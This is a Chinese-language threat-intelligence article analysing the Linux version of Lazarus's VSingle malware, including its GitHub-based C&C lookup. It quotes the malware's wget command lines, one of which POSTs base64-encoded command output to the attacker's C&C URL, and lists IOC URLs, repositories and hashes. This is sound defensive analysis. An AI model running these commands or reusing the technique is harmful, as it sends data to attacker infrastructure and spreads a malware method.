某些恶意软件使用 DGA、虚假 C&C 服务器等方式隐藏原始 C&C 服务器，有些恶意软件则通过合法服务获取 C&C 服务器地址。最近，Lazarus
使用的恶意软件 VSingle 进行了更新升级，通过 GitHub 检索 C&C 服务器信息。VSingle 能够针对 Windows 与 Linux
双平台发起攻击，本文以后者为例进行介绍。

## VSingle 概述

VSingle 默认带有三个硬编码的 C&C 服务器地址。当恶意软件无法连接 C&C 服务器时，就会访问 GitHub 以获取新的 C&C
服务器列表。下图显示了 VSingle 的操作流程：

![image.png-68.1kB](https://image.3001.net/images/20220708/1657284056_62c825d85400e7758b15d.png!small)VSingle
操作流程

首次连接发送的 UID 中包含主机名、内核版本号与 IP 地址八位字节，UPW 中包含 `IP地址|30.0|12b`的 base64 编码字符。

    
    
    https://mantis.westlinks.net/api/soap/mc_enum.php?uid=[]&upw=[]

C&C 服务器的响应存储在 `/tmp/.sess_%08x`中，数据之后存放的是 AES 密钥、IV 数据与 base64 编码+RC4加密的命令。

## GitHub 访问模式

请求的 GitHub 存储库不是固定的，而是动态生成的。以下是访问的 URL 的生成模式：

    
    
    https://raw.githubusercontent.com/%s/%s/master/README.de

用户名和存储库名称是从以下列表中随机选择的字符串 + 添加的随机字符串：

![image.png-52.9kB](https://image.3001.net/images/20220708/1657284056_62c825d8ef44aef8fea90.png!small)用户名与存储库名称

GitHub 存储库的文件中包含一个 URL 地址，如下所示。

![image.png-374.5kB](https://image.3001.net/images/20220708/1657284057_62c825d9f086332d81874.png!small)GitHub
存储库

恶意软件请求 GitHub 获取该 URL 地址，所有发现的 URL 如下所示：

> <https://github.com/bgrav1ty13j/bPanda3>
>
> <https://github.com/fwo0d17n/fWr0te>
>
> <https://github.com/glucky18p/gluxuryboy>
>
> <https://github.com/gf00t18p/gpick/>
>
>
> [https://github.com/jv0siej21g/jlaz3rpik﻿](https://github.com/jv0siej21g/jlaz3rpik)

## 通信方式

新版本的 VSingle 使用 wget 与 C&C 服务器进行通信，如下所示。（注：Windows 平台下的 VSingle 仍然使用 Windows
API）

![image.png-1003.5kB](https://image.3001.net/images/20220708/1657284058_62c825daf3fea5a848056.png!small)执行
wet 的命令

大多数恶意软件为了避免留下痕迹，都使用系统调用或者其他方式与 C&C 服务器通信，但 VSingle 无惧于此。实际通信过程中，会执行的命令为：

    
    
    sh -c "wget -t 1 --server-response --no-check-certificate --user-agent=\"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.24 Safari/537.36\" \"https://mantis.westlinks.net/api/soap/mc_enum.php?uid=15022694&upw=MTkyLjE2OC4yLjI0fDMwLjB8MTJi\" -O /tmp/.sess_7b00cf8e 2>&1 | awk '/^ HTTP/{print $2}'"

命令执行结果保存在 /tmp/.sess_%04x，其内容是 base64 编码的，通过 HTTP POST 请求发送，如下所示：

    
    
    sh -c "wget -t 1 --server-response --no-check-certificate --post-data=\"uid=15022694&fipng=`base64 /tmp/.sess_%04x`\" --user-agent=\"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.24 Safari/537.36\" \"https://mantis.westlinks.net/api/soap/mc_enum.php?uid=15022694&jsid=[AES Key, IV]\" -O /tmp/.sess_7b00cf8e 2>&1 | awk '/^ HTTP/{print $2}'"

## 结论

攻击者经常会攻陷合法的 Web 服务器或者使用合法的云服务来隐藏与 C&C 服务器的通信。很难检测到此类恶意软件，一定要多加注意。

## IOC

> <https://mantis.westlinks.net/api/soap/mc_enum.php>  
> <https://www.shipshorejob.com/ckeditor/samples/samples.php>  
> <http://crm.vncgroup.com/cats/scripts/sphinxview.php>  
> <https://ougreen.com/zone>  
> <https://tecnojournals.com/general>  
> <https://semiconductboard.com/xcror>  
> <https://bluedragon.com/login>  
> <https://tecnojournals.com/prest>  
> 199ba618efc6af9280c5abd86c09cdf2d475c09c8c7ffc393a35c3d70277aed1  
> 2eb16dbc1097a590f07787ab285a013f5fe235287cb4fb948d4f9cce9efa5dbc  
> 414ed95d14964477bebf86dced0306714c497cde14dede67b0c1425ce451d3d7

## 参考来源

> [JPCERT](https://blogs.jpcert.or.jp/en/2022/07/vsingle.html)

